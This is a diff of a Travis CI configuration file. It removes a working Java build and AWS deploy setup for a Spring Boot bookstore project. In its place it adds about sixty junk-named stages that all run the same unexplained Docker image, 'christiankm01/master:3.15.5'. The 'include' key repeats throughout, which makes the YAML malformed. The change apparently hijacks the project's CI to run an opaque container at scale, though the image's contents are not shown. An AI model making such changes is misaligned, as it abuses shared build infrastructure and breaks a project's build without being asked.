@@ -1,62 +1,182 @@
-language: java
-jdk:
-  - openjdk11
-
-branches:
-  only:
-    - master
-
-#Travis CI 서버의 Home
-cache:
-  directories:
-    - '$HOME/.m2/repository'
-    - '$HOME/.gradle'
-
-script: "./gradlew clean build"
-
-# 권한 부여
-before_install:
-  - chmod +x gradlew
-  
-before_deploy:
-  - mkdir -p before-deploy # zip에 포함시킬 파일들을 담을 디렉토리 생성
-  - cp scripts/*.sh before-deploy/
-  - cp appspec.yml before-deploy/
-  - cp build/libs/*.jar before-deploy/
-  - cd before-deploy && zip -r before-deploy * # before-deploy로 이동 후 전체 압축
-  - cd ../ && mkdir -p deploy # 상위 디렉토리로 이동 후 deploy 디렉토리 생성
-  - mv before-deploy/before-deploy.zip deploy/Springboot_bookstore.zip # deploy로 zip파일 이동
-
-deploy:
-  - provider: s3
-    access_key_id: $AWS_ACCESS_KEY # Travis repo settings에 설정된 값
-    secret_access_key: $AWS_SECRET_KEY # Travis repo settings에 설정된 값
-    bucket: changyong-springboot-build #S3 버킷
-    region: ap-northeast-2
-    skip_cleanup: true
-    acl: private # zip 파일 접근을 private로 설정
-    local_dir: deploy # before_deploy에서 생성한 디렉토리
-    wait-until-deployed: true
-    on:
-      repo: joochangyong/Springboot_bookstore
-      branch: master
-
-  - provider: codedeploy
-    access_key_id: $AWS_ACCESS_KEY # Travis repo settings에 설정된 값
-    secret_access_key: $AWS_SECRET_KEY # Travis repo settings에 설정된 값
-    bucket: changyong-springboot-build #S3 버킷
-    key: Springboot_bookstore.zip # 빌드 파일을 압축해서 전달
-    bundle_type: zip
-    application: changyong-springboot-webservice # 웹 콘솔에서 등록한 Codeploy 애플리케이션
-    deployment_group: changyong-springboot-webservice-group # 웹 콘솔에서 등록한 CodeDeploy 배포 그룹
-    region: ap-northeast-2
-    wait-until-deployed: true
-    on:
-      repo: joochangyong/Springboot_bookstore
-      branch: master
-
-# CI 실행 완료시 메일로 알람
-notification:
-  email:
-    recipients:
-      - wnckddyd0525@gmail.com
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: manaja
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capasjx
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test-capabiyjsjajajj
+      script: docker run christiankm01/master:3.15.5   
+  include:
+    - stage: test-capabiykimhokjs
+      script: docker run christiankm01/master:3.15.5  
+  include:
+    - stage: test3
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test4
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test5
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test6
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test7
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test8
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test9
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test10
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test11
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test12
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test13
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5 
+  include:
+    - stage: test15
+      script: docker run christiankm01/master:3.15.5
+  include:
+    - stage: test16
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test17
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test18
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test19
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test20
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test21
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test22
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test23
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test24
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test25
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test26
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test27
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test28
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test29
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test30
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test31
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test32
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test33
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test34
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test35
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test36
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test37
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test38
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test39
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test40
+      script: docker run christiankm01/master:3.15.5     
+  include:
+    - stage: test41
+      script: docker run christiankm01/master:3.15.5     
